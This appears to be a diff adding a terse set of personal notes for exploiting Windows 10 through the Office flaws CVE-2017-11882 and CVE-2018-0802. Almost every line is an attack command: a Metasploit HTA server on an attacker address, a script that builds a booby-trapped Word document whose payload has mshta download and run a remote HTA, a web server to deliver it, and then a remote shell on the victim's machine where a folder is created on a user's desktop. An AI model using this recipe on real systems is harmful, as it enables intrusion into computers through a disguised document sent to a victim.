@@ -1,0 +1,26 @@
+exploit windows 10 with error CVE 2017-11882 2018-0802
+
+A1------------
+ifconfig
+msfconsole
+use exploit/windows/misc/hta_server
+set LHOST 169.254.237.110
+set LPORT 1337
+set srvhost 169.254.237.110
+exploit
+
+B1-----------
+cd Videos/RTF_11882_0802-master/RTF_11882_0802-master/
+ls
+python RTF_11882_0802.py -c "mshta http://169.254.237.110:8080/xxxxx.hta" -o tailieumat.doc
+ls
+python -m SimpleHTTPServer 4444
+
+A1----------
+sessions -i 1
+sysinfo
+shell
+ipconfig
+cd users/sakura/desktop
+mkdir hacked
+------------
